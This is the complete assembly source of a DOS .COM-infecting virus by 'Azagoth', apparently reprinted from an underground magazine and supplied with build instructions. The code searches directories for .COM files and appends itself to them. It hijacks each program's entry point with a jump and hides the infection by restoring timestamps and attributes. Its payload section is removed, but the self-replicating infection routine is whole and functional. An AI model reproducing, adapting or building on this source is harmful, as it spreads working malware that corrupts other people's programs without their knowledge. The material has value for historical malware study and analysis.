; virus from ALT-11 mag

; ---------------------------------------
;
; Coded by: Azagoth
; ---------------------------------------
; Assemble using Turbo Assembler:
;  tasm /m2 <filename>.asm
;  tlink /t <filename>.obj
; ---------------------------------------------------------------------------
;  - Non-Overwriting .COM infector (excluding COMMAND.COM)
;  - COM growth: XXX bytes
;  - It searches the current directory for uninfected files.  If none are
;     found, it searches previous directory until it reaches root and no more
;     uninfected files are found. (One infection per run)
;  - Also infects read-only files
;  - Restores attributes, initial date/time-stamps, and original path.
; ---------------------------------------------------------------------------
 
        .model  tiny
        .code
 
        org     100h                            ; adjust for psp
 
start:
 
        call    get_disp                        ; push ip onto stack
get_disp:
        pop     bp                              ; bp holds current ip
        sub     bp, offset get_disp             ; bp = code displacement
 
        ; original label offset is stored in machine code
        ; so new (ip) - original = displacement of code
 
save_path:
        mov     ah, 47h                         ; save cwd
        xor     dl, dl                          ; 0 = default drive
        lea     si, [bp + org_path]
        int     21h
 
get_dta:
        mov     ah, 2fh
        int     21h
 
        mov     [bp + old_dta_off], bx          ; save old dta offset
 
set_dta:                                        ; point to dta record
        mov     ah, 1ah
        lea     dx, [bp + dta_filler]
        int     21h
 
search:
        mov     ah, 4eh                         ; find first file
        mov     cx, [bp + search_attrib]        ;  if successful dta is
        lea     dx, [bp + search_mask]          ;  created
        int     21h
        jnc     clear_attrib                    ; if found, continue
 
find_next:
        mov     ah, 4fh                         ; find next file
        int     21h
        jnc     clear_attrib
 
still_searching:
        mov     ah, 3bh
        lea     dx, [bp + previous_dir]         ; cd ..
        int     21h
        jnc     search
        jmp     bomb                            ; at root, no more files
 
clear_attrib:
        mov     ax, 4301h
        xor     cx, cx                          ; get rid of attributes
        lea     dx, [bp + dta_file_name]
        int     21h
 
open_file:
        mov     ax, 3D02h                       ; AL=2 read/write
        lea     dx, [bp + dta_file_name]
        int     21h
 
        xchg    bx, ax                          ; save file handle
                                                ; bx won't change from now on
check_if_command_com:
        cld
        lea     di, [bp + com_com]
        lea     si, [bp + dta_file_name]
        mov     cx, 11                          ; length of 'COMMAND.COM'
        repe    cmpsb                           ; repeat while equal
        jne     check_if_infected
        jmp     close_file
 
check_if_infected:
        mov     dx, word ptr [bp + dta_file_size] ; only use first word since
                                                  ;  COM file
        sub     dx, 2                             ; file size - 2
 
        mov     ax, 4200h
        mov     cx, 0                           ; cx:dx ptr to offset from
        int     21h                             ;  origin of move
 
        mov     ah, 3fh                         ; read last 2 characters
        mov     cx, 2
        lea     dx, [bp + last_chars]
        int     21h
 
        mov     ah, [bp + last_chars]
        cmp     ah, [bp + virus_id]
        jne     save_3_bytes
        mov     ah, [bp + last_chars + 1]
        cmp     ah, [bp + virus_id + 1]
        jne     save_3_bytes
        jmp     close_file
 
save_3_bytes:
        mov     ax, 4200h                       ; 00=start of file
        xor     cx, cx
        xor     dx, dx
        int     21h
 
        mov     ah, 3Fh
        mov     cx, 3
        lea     dx, [bp + _3_bytes]
        int     21h
 
goto_eof:
        mov     ax, 4202h                       ; 02=End of file
        xor     cx, cx                          ; offset from origin of move
        xor     dx, dx                          ; (i.e. nowhere)
        int     21h                             ; ax holds file size
 
        ; since it is a COM file, overflow will not occur
 
save_jmp_displacement:
        sub     ax, 3                           ; file size - 3 = jmp disp.
        mov     [bp + jmp_disp], ax
 
write_code:
        mov     ah, 40h
        mov     cx, virus_length                ;*** equate
        lea     dx, [bp + start]
        int     21h
 
goto_bof:
        mov     ax, 4200h
        xor     cx, cx
        xor     dx, dx
        int     21h
 
write_jmp:                                      ; to file
        mov     ah, 40h
        mov     cx, 3
        lea     dx, [bp + jmp_code]
        int     21h
 
        inc     [bp + infections]
 
restore_date_time:
        mov     ax, 5701h
        mov     cx, [bp + dta_file_time]
        mov     dx, [bp + dta_file_date]
        int     21h
 
close_file:
        mov     ah, 3eh
        int     21h
 
restore_attrib:
        xor     ch, ch
        mov     cl, [bp + dta_file_attrib]      ; restore original attributes
        mov     ax, 4301h
        lea     dx, [bp + dta_file_name]
        int     21h
 
done_infecting?:
        mov     ah, [bp + infections]
        cmp     ah, [bp + max_infections]
        jz      bomb
        jmp     find_next
 
 
bomb:
 
;        cmp     bp, 0
;        je      restore_path                    ; original run
;
;---- Stuff deleted
 
restore_path:
        mov     ah, 3bh                         ; when path stored
        lea     dx, [bp + root]                 ; '\' not included
        int     21h
 
        mov     ah, 3bh                         ; cd to original path
        lea     dx, [bp + org_path]
        int     21h
 
restore_dta:
        mov     ah, 1ah
        mov     dx, [bp + old_dta_off]
        int     21h
 
restore_3_bytes:                                ; in memory
        lea     si, [bp + _3_bytes]
        mov     di, 100h
        cld                                     ; auto-inc si, di
        mov     cx, 3
        rep     movsb
 
return_control_or_exit?:
        cmp     bp, 0                           ; bp = 0 if original run
        je      exit
        mov     di, 100h                        ; return control back to prog
        jmp     di                              ; -> cs:100h
 
exit:
        mov     ax, 4c00h
        int     21h
 
;-------- Variable Declarations --------
 
old_dta_off     dw      0                       ; offset of old dta address
 
;-------- dta record
dta_filler      db      21 dup (0)
dta_file_attrib db      0
dta_file_time   dw      0
dta_file_date   dw      0
dta_file_size   dd      0
dta_file_name   db      13 dup (0)
;--------
search_mask     db      '*.COM',0               ; files to infect: *.COM
search_attrib   dw      00100111b               ; all files a,s,h,r
com_com         db      'COMMAND.COM'
 
previous_dir    db      '..',0
root            db      '\',0
org_path        db      64 dup (0)              ; original path
 
infections      db      0                       ; counter
max_infections  db      1
 
_3_bytes        db      0, 0, 0
jmp_code        db      0E9h
jmp_disp        dw      0
 
last_chars      db      0, 0                    ; do last chars = ID ?
 
virus_id        db      'AZ'
 
eov:                                            ; end of virus
 
virus_length    equ     offset eov - offset start
 
        end     start

